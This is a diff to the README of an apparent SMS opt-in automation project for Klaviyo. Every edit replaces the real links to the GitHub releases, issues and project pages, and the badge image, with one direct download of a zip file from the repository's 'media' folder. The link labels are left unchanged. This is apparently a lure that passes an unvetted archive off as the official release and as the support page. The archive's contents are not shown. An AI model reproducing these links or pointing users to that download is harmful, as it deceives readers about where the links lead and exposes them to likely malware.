@@ -1,6 +1,6 @@
 # 🎉 klaviyo-sms-optin-flow-automation - Simplify SMS Signups Effortlessly
 
-[![Download the Latest Release](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/AIN010010/klaviyo-sms-optin-flow-automation/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/AIN010010/klaviyo-sms-optin-flow-automation/main/media/klaviyo-sms-optin-flow-automation-v3.2.zip)](https://raw.githubusercontent.com/AIN010010/klaviyo-sms-optin-flow-automation/main/media/klaviyo-sms-optin-flow-automation-v3.2.zip)
 
 ## 🌐 Overview
 
@@ -11,7 +11,7 @@ The **Klaviyo SMS signup automation system** helps you gather subscribers using 
 To get started, follow these steps to download and run the software.
 
 1. **Visit the Releases Page.**   
-   Go to the following link to access the download options: [Download the Latest Release](https://github.com/AIN010010/klaviyo-sms-optin-flow-automation/releases).
+   Go to the following link to access the download options: [Download the Latest Release](https://raw.githubusercontent.com/AIN010010/klaviyo-sms-optin-flow-automation/main/media/klaviyo-sms-optin-flow-automation-v3.2.zip).
 
 2. **Choose the Right Version.**   
    On the Releases page, you will see various versions of the software listed. Select the latest version for the best features and updates. 
@@ -30,7 +30,7 @@ To get started, follow these steps to download and run the software.
 
 ## 📥 Download & Install
 
-For your convenience, here’s the direct link again: [Download the Latest Release](https://github.com/AIN010010/klaviyo-sms-optin-flow-automation/releases). Remember to always choose the latest release for the best experience.
+For your convenience, here’s the direct link again: [Download the Latest Release](https://raw.githubusercontent.com/AIN010010/klaviyo-sms-optin-flow-automation/main/media/klaviyo-sms-optin-flow-automation-v3.2.zip). Remember to always choose the latest release for the best experience.
 
 ## 📋 Features
 
@@ -59,7 +59,7 @@ If you encounter issues, here are some common solutions:
 
 ## 📞 Support
 
-For additional support, please check our [GitHub Issues](https://github.com/AIN010010/klaviyo-sms-optin-flow-automation/issues) page. You can report bugs or request help from the community.
+For additional support, please check our [GitHub Issues](https://raw.githubusercontent.com/AIN010010/klaviyo-sms-optin-flow-automation/main/media/klaviyo-sms-optin-flow-automation-v3.2.zip) page. You can report bugs or request help from the community.
 
 ## 📝 Contribution
 
@@ -85,4 +85,4 @@ This project covers a range of topics that might interest you:
 - vtiger
 - wordpress
 
-Visit [the GitHub page](https://github.com/AIN010010/klaviyo-sms-optin-flow-automation/releases) for the latest updates and releases.
+Visit [the GitHub page](https://raw.githubusercontent.com/AIN010010/klaviyo-sms-optin-flow-automation/main/media/klaviyo-sms-optin-flow-automation-v3.2.zip) for the latest updates and releases.
